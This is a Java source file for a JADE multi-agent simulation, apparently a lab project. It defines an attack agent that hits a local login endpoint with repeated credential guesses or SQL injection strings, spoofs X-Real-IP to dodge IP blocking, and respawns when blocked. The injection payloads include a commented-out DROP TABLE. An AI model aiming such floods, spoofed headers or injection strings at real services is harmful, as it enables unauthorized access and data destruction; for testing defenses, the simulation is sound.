package agentes;

import jade.core.Agent;
import jade.core.behaviours.TickerBehaviour;

import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import jade.lang.acl.ACLMessage;
import jade.lang.acl.MessageTemplate;

import jade.domain.DFService;
import jade.domain.FIPAAgentManagement.DFAgentDescription;
import jade.domain.FIPAAgentManagement.ServiceDescription;
import jade.domain.FIPAException;
import jade.domain.FIPANames;

import java.io.OutputStream;
import java.nio.charset.StandardCharsets;
import java.util.Random;



public class AttackAgent extends Agent {

    private boolean notifiedCreate = false;

    private static final String[] USERNAMES = {"admin", "root", "user", "test"};
    private static final String[] PASSWORDS = {"1234", "password", "admin", "root"};


    private String generateAttackIp() {
        int part3 = (int)(Math.random() * 256);
        int part4 = (int)(Math.random() * 256);
        return "10.0." + part3 + "." + part4;
    }

    protected void setup(){
        String fakeIp = generateAttackIp();
        int tipoAtaque = (int)(Math.random() * 2);
        if(tipoAtaque == 0){
            System.out.println(getLocalName() + ": Tipo selecionado = Injection");
            addBehaviour(new InjectionBehaviour(this, 1000, fakeIp));

        }
        else if(tipoAtaque == 1){
            System.out.println(getLocalName() + ": Tipo selecionado = DoS");
            addBehaviour(new DosBehaviour(this, 300, fakeIp));
        }
    }

    private class DosBehaviour extends TickerBehaviour {
        private final String fakeIp;
        private final Random rnd = new Random();

        public DosBehaviour(Agent a, long period, String fakeIp) {
            super(a, period);
            this.fakeIp = fakeIp;
        }

        protected void onTick() {
            try {
                /* ► gera credenciais aleatórias  */
                String user = USERNAMES[rnd.nextInt(USERNAMES.length)];
                String pass = PASSWORDS[rnd.nextInt(PASSWORDS.length)];

                /* ► cria JSON exatamente como o front‑end faz                */
                String json = String.format(
                    "{\"username\":\"%s\",\"password\":\"%s\"}", user, pass);

                URL url = new URL("http://localhost:8080/");
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-Type", "application/json");
                con.setRequestProperty("X-Real-IP", fakeIp);
                con.setDoOutput(true);

                /* ► escreve o JSON no corpo                                     */
                try (OutputStream os = con.getOutputStream()) {
                    os.write(json.getBytes(StandardCharsets.UTF_8));
                }

                int code = con.getResponseCode();
                System.out.printf("[ATTACK] %s --> %d (%s:%s)%n",
                                getLocalName(), code, user, pass);

                if(code == 403){
                    doDelete();
                }

                /* trate 403/429/etc. se quiser… */

            } catch (Exception e) {
                System.err.println("[ATTACK] erro: " + e);
                doDelete();
            }
        }
    }

    private class InjectionBehaviour extends TickerBehaviour {
            private final String fakeIp;  
            private final Random rnd = new Random();

        public InjectionBehaviour(Agent a, long period, String fakeIp) {
            super(a, period);
            this.fakeIp = fakeIp;
        }
        protected void onTick() {
            try {
                /* ► payloads maliciosos */
                String[] payloads = {
                    "admin' --"//,
                    // "' OR '1'='1",
                    // "'; DROP TABLE users; --",
                    // "' UNION SELECT null,null --",
                    // "' OR 1=1#"
                };
                String inj = payloads[rnd.nextInt(payloads.length)];

                /* ► monta JSON com o username = payload injetado */
                String json = String.format(
                    "{\"username\":\"%s\",\"password\":\"malicioso\"}",
                    inj.replace("\"", "\\\"")  // escapa aspas duplas
                );

                URL url = new URL("http://localhost:8080/");   // ajuste se precisar /login
                HttpURLConnection con = (HttpURLConnection) url.openConnection();
                con.setRequestMethod("POST");
                con.setRequestProperty("Content-Type", "application/json");
                con.setRequestProperty("X-Real-IP", fakeIp);   // IP falso
                con.setDoOutput(true);

                /* ► envia corpo JSON */
                try (OutputStream os = con.getOutputStream()) {
                    os.write(json.getBytes(StandardCharsets.UTF_8));
                }

                int code = con.getResponseCode();
                System.out.printf("[INJECTION] %s -> %d (%s)%n",
                                getAgent().getLocalName(), code, inj);

                /* ► se bloqueado, encerra o agente */
                if (code == 403 || code == 429) {
                    System.out.println("[INJECTION] Bloqueado. Encerrando agente.");
                    doDelete();
                }

            } catch (Exception e) {
                System.err.printf("[INJECTION] erro: %s%n", e.getMessage());
                doDelete();
            }
        }
    }


    // protected void setup() {
    //     String fakeIp = generateAttackIp();
    //     System.out.println("[ATTACK] Agente de ataque" + getLocalName() + " usando IP: " + fakeIp);
    //     addBehaviour(new TickerBehaviour(this, 350) {
    //         protected void onTick() {
    //             try {
    //                 System.out.println("[ATTACK] Enviando requisição...");
    //                 URL url = new URL("http://localhost:8080/");
    //                 HttpURLConnection con = (HttpURLConnection) url.openConnection();
    //                 con.setRequestMethod("POST");
    //                 con.setRequestProperty("X-Real-IP", fakeIp);
    //                 int code = con.getResponseCode();

    //                 if (code == 403) {
    //                     System.out.println("[ATTACK] Agente de ataque bloqueado. Encerrando agente.");   
    //                 }

    //                 InputStream in = con.getInputStream();
    //                 in.close();
    //             } catch (Exception e) {
    //                 System.out.println("[ATTACK] Erro no agente de ataque " + getLocalName() + ": " + e.getMessage() + " Agente sendo encerrado.");
    //                 doDelete();
    //                 return;
    //             }
    //         }
    //     });
    // }
    
    
    
//----------------------------------------------------------------------
    
    protected void takeDown() {
    if (!notifiedCreate) {
        notifiedCreate = true;
        System.out.println("[ATTACK] " + getLocalName() + " sendo encerrado. Enviando mensagem ao CreateAttackAgent.");

        try {
            DFAgentDescription template = new DFAgentDescription();
            ServiceDescription sd = new ServiceDescription();
            sd.setType("Create-Attack");
            template.addServices(sd);

            DFAgentDescription[] result = DFService.search(this, template);
            if (result.length > 0) {
                ACLMessage msg = new ACLMessage(ACLMessage.REQUEST);
                msg.addReceiver(result[0].getName());
                msg.setProtocol(FIPANames.InteractionProtocol.FIPA_REQUEST);
                msg.setContent("criar");
                send(msg);
                System.out.println("[ATTACK] Mensagem enviada ao CreateAttackAgent.");
            } else {
                System.out.println("[ATTACK] Nenhum agente CreateAttackAgent encontrado.");
            }
        } catch (FIPAException e) {
            e.printStackTrace();
        }
        
    }
    return;
}

}





